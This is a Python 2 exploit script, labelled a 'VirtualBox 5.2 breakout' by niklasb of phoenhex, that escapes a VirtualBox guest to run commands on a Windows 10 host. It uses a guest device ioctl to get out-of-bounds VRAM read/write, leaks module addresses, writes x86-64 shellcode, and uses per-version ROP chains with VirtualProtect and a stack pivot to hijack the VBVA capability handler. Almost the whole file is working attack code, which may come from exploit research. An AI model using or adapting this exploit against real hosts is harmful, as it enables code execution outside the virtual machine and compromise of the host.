import os, fcntl, struct, array, sys, time, threading, signal
from tools import x86_64
from wintools import hash_both, api_call_stub64

print
print '     --==[[ VirtualBox 5.2 breakout ]]==--'
print
print '           by niklasb from phoenhex'
print

winbuild = '1709'
vboxbuild = '5.2'
cmd = 'notepad.exe'
vuln = 'BPB_TRANSFER'   # 'BPB_TRANSFER' or 'PRESENT_BLT'

if len(sys.argv) > 1:
    winbuild = sys.argv[1]
    vboxbuild = sys.argv[2]

print '[*] Targeting VBox %s on Windows 10 %s using %s primitive' % (
        vboxbuild, winbuild, vuln)

if vboxbuild == '5.1.28':
    offset_mmio_vdd_ptr = 0x70
    offset_vgastate_drv = 0x10db8

    # offset of the IAT entry for DisableThreadLibraryCalls
    offset_vdd_iat_disablethreadlibcalls = 0x1100F8
    # offset of a large (2-page) R/W buffer
    buf = 0x337000
elif vboxbuild == '5.1.30':
    offset_mmio_vdd_ptr = 0x70
    offset_vgastate_drv = 0x10db8

    offset_vdd_iat_disablethreadlibcalls = 0x1100F8
    buf = 0x337000
elif vboxbuild == '5.2':
    offset_mmio_vdd_ptr = 0x80
    offset_vgastate_drv = 0x10dc0

    offset_vdd_iat_disablethreadlibcalls = 0x1170F8
    buf = 0x341000
else:
    assert False, "Unsupported VBox build"

if winbuild == '1607':
    offset_k32_disablethreadlibcalls = 0x1f540
    offset_k32_virtualprotect = 0x1bc10
elif winbuild == '1703':
    offset_k32_disablethreadlibcalls = 0x1e360
    offset_k32_virtualprotect = 0x1b320
elif winbuild == '1709':
    offset_k32_disablethreadlibcalls = 0x11220
    offset_k32_virtualprotect = 0xe0d0
else:
    assert False, "Unsupported windows build"

def p64(x):
    x%=2**64
    return struct.pack('<Q', x)

def u64(x):
    return struct.unpack('<Q', x)[0]

fd = os.open('/dev/vboxpwn', os.O_NONBLOCK | os.O_RDWR)

def relread(offset, size):
    reqtyp = {'BPB_TRANSFER': 4, 'PRESENT_BLT': 1}[vuln]
    data = ''
    data += struct.pack("<IIq", reqtyp, size, offset)
    data += '\0'*size
    data = array.array('b', data)
    fcntl.ioctl(fd, len(data), data, 1)
    return data[16:].tostring()

def relwrite(offset, payload):
    reqtyp = {'BPB_TRANSFER': 5, 'PRESENT_BLT': 2}[vuln]
    data = ''
    data += struct.pack("<IIq", reqtyp, len(payload), offset)
    data += payload
    fcntl.ioctl(fd, len(data), data)

def get_vram_size():
    data = ''
    data += struct.pack("<IIq", 6, 0, 0)
    data += '\0'*4
    data = array.array('b', data)
    fcntl.ioctl(fd, len(data), data)
    return struct.unpack('<I', data[16:])[0]

def vbva(typ, cmd):
    data = ''
    data += struct.pack("<IIq", 3, len(cmd), typ)
    data += cmd
    fcntl.ioctl(fd, len(data), data)

vram_size = get_vram_size()
print '[*] We have %d bytes of VRAM' % vram_size

vram, = struct.unpack('<Q',relread(vram_size+8, 8))
print '[*] VRam @ 0x%016x' % vram

def read(x, sz):
    return relread(x - vram, sz)

def read64(x):
    return u64(read(x, 8))

def write(x, dat):
    chunksz = 0x200
    for i in range(0, len(dat), chunksz):
        relwrite(x - vram + i, dat[i:i+chunksz])

def write64(x, y):
    write(x, p64(y))

addr = read64(vram + vram_size + offset_mmio_vdd_ptr)
addr &= ~0xfff
while True:
    if read(addr, 2) == 'MZ':
        break
    addr -= 0x1000
vboxdd = addr

print '[*] VBoxDD @ 0x%016x' % vboxdd

kernel32 = read64(vboxdd+offset_vdd_iat_disablethreadlibcalls) - offset_k32_disablethreadlibcalls
print '[*] kernel32 @ 0x%016x' % kernel32

vgastate = read64(vram + vram_size)
vgastate = read64(vgastate + 0x38)
print '[*] VGAState @ 0x%016x' % vgastate

drv = read64(vgastate + offset_vgastate_drv)
print '[*] Drv @ 0x%016x' % drv

tmp = vboxdd + buf + 0x100
print '[*] Shellcode @ 0x%016x' % tmp

write64(tmp, 0xdeadbeef)
assert read64(tmp) == 0xdeadbeef
print '[*] Verified arbitrary R/W primitive'
raw_input('[*] Press ENTER to continue exploit...')

loc_sc = tmp
loc_rop2 = tmp + 0x300
loc_saved_drv = tmp + 0x400
loc_saved_rsp = tmp + 0x500
new_stack = tmp + 0x1000

sc = x86_64.assemble(r'''
    mov rsp, {new_stack}
    and rsp, ~0xf

    ; restore driver state
    mov rcx, {drv}
    mov rdx, {loc_saved_drv}
    mov r8, 0x100
    mov r10, {memmove}
    call api_call

    mov rcx, 0
    mov rdx, 0
    lea r8, [rel payload]
    mov r9, 0
    push 0
    push 0
    mov r10, {CreateThread}
    call api_call

    ; return from the handler so the VM continues execution
    mov rax, {loc_saved_rsp}
    mov rsp, [rax]
    ret

payload:
    and rsp, ~0xf

    ; simple WinExec() PoC
    lea rcx, [rel cmd]
    mov rdx, 5
    mov r10, {WinExec}
    call api_call

    ; make sure we don't crash for whatever reason once the thread dies
sleep_loop:
    mov rcx, 10000
    mov r10, {Sleep}
    call api_call
    jmp sleep_loop

cmd:
    db '{cmd}', 0
'''.format(
    WinExec=hash_both('kernel32', 'WinExec'),
    ExitProcess=hash_both('kernel32', 'ExitProcess'),
    memmove=hash_both('ntdll', 'memmove'),
    CreateThread=hash_both('kernel32', 'CreateThread'),
    Sleep=hash_both('kernel32', 'Sleep'),
    new_stack=new_stack,
    drv=drv,
    loc_saved_drv=loc_saved_drv,
    loc_saved_rsp=loc_saved_rsp,
    cmd=cmd,
) + api_call_stub64)
assert len(sc) < 0x300

print '[*] Writing shellcode'
write(loc_sc, sc)

if vboxbuild == '5.1.28':
    dummy = tmp - 0x10

    trap = vboxdd+0xd64ef # int3  ; retn 0x0000
    rop2 = ''

    # save RAX (old stack pointer)
    rop2 += p64(vboxdd + 0x7753) # pop rcx ; ret
    rop2 += p64(loc_saved_rsp)
    rop2 += p64(vboxdd + 0x8565f) # mov qword [rcx], rax ; ret

    rop2 += p64(vboxdd + 0x7753) # pop rcx ; ret
    rop2 += p64(loc_sc & ~0xfff)
    rop2 += p64(vboxdd + 0xa4c03) # pop rdx ; ret
    rop2 += p64(0x2000)
    rop2 += p64(vboxdd + 0x98e31) # 0x180098e31: pop r8 ; xor al, al ; add rsp, 0x20 ; pop rbx ; ret
    rop2 += p64(0x40)
    rop2 += 'A'*0x28

    rop2 += p64(vboxdd + 0x10d9b0) # pop rsi ; ret
    rop2 += p64(vboxdd + 0x10d9b0) # pop1 + ret

    rop2 += p64(vboxdd + 0x7c160) # 0x18007c160: pop r9 ; push rbp ; push rsi ; ret
    rop2 += p64(dummy)

    rop2 += p64(kernel32 + offset_k32_virtualprotect)
    rop2 += p64(loc_sc)
    assert len(rop2) <= 0x100

    # stack pivot
    rop = ''
    rop += p64(vboxdd + 0x30e0) # pop rsp ; ret
    rop += p64(loc_rop2)

    # overwrite pfnVBVAGuestCapabilityUpdate at +0x90 of the
    print '[*] Launching %r'%cmd
    time.sleep(0.1)
    write(loc_saved_drv, read(drv, 0x100))
    write(loc_rop2, rop2)
    write(drv, rop)
    write(drv + 0x90, p64(vboxdd + 0xf4e4)) # xchg eax, esp ; ret

    # send VBVA_INFO_CAPS VBVA command to trigger GuestCapabilityUpdate handler
    # and get RIP control. RAX will point to driver struct
    vbva(12, struct.pack("<II", 1, 2))
elif vboxbuild == '5.1.30':
    dummy = tmp - 0x10

    trap = vboxdd+0xd658f # int3  ; retn 0x0000
    rop2 = ''

    # save RAX (old stack pointer)
    rop2 += p64(vboxdd + 0x7753) # pop rcx ; ret
    rop2 += p64(loc_saved_rsp)
    rop2 += p64(vboxdd + 0x856ff) # mov qword [rcx], rax ; ret

    rop2 += p64(vboxdd + 0x7753) # pop rcx ; ret
    rop2 += p64(loc_sc & ~0xfff)
    rop2 += p64(vboxdd + 0xa4ca3) # pop rdx ; ret
    rop2 += p64(0x2000)
    rop2 += p64(vboxdd + 0x98ed1) # 0x180098e31: pop r8 ; xor al, al ; add rsp, 0x20 ; pop rbx ; ret
    rop2 += p64(0x40)
    rop2 += 'A'*0x28

    rop2 += p64(vboxdd + 0x2022) # pop rsi ; ret
    rop2 += p64(vboxdd + 0x2022) # pop1 + ret

    rop2 += p64(vboxdd + 0x7c200) # 0x18007c160: pop r9 ; push rbp ; push rsi ; ret
    rop2 += p64(dummy)

    rop2 += p64(kernel32 + offset_k32_virtualprotect)
    rop2 += p64(loc_sc)
    assert len(rop2) <= 0x100

    rop = ''
    rop += p64(vboxdd + 0x30e0) # pop rsp ; ret
    rop += p64(loc_rop2)

    print '[*] Launching %r'%cmd
    time.sleep(0.1)
    write(loc_saved_drv, read(drv, 0x100))
    write(loc_rop2, rop2)
    write(drv, rop)
    write(drv + 0x90, p64(vboxdd + 0xf4e4)) # xchg eax, esp ; ret

    vbva(12, struct.pack("<II", 1, 2))
elif vboxbuild == '5.2':
    dummy = tmp - 0x10

    trap = vboxdd+0xf6f3f # int3  ; retn 0x0000

    rop2 = ''
    # save RAX (old stack pointer)
    rop2 += p64(vboxdd + 0x7ed71) # pop rcx ; ret
    rop2 += p64(loc_saved_rsp)
    rop2 += p64(vboxdd + 0x882ff) # mov qword [rcx], rax ; ret

    rop2 += p64(vboxdd + 0x7ed71) # pop rcx ; ret
    rop2 += p64(loc_sc & ~0xfff)
    rop2 += p64(vboxdd + 0xa7273) # pop rdx ; ret
    rop2 += p64(0x2000)
    rop2 += p64(vboxdd + 0x9b501) # pop r8 ; xor al, al ; add rsp, 0x20 ; pop rbx ; ret
    rop2 += p64(0x40)
    rop2 += 'A'*0x28

    rop2 += p64(vboxdd + 0x2042) # pop rsi ; ret
    rop2 += p64(vboxdd + 0x2042) # pop1 + ret

    rop2 += p64(vboxdd + 0x7ed80) # pop r9 ; push rbp ; push rsi ; ret
    rop2 += p64(dummy)

    rop2 += p64(kernel32 + offset_k32_virtualprotect)
    rop2 += p64(loc_sc)
    assert len(rop2) <= 0x100

    rop = ''
    rop += p64(vboxdd + 0x31c0) # pop rsp ; ret
    rop += p64(loc_rop2)

    write(loc_saved_drv, read(drv, 0x100))
    write(loc_rop2, rop2)
    write(drv, rop)
    write(drv + 0x90, p64(vboxdd + 0xd845)) # xchg eax, esp ; ret
    vbva(12, struct.pack("<II", 1, 2))
else:
    assert False, "No ROP chain implemented for this VBox version"
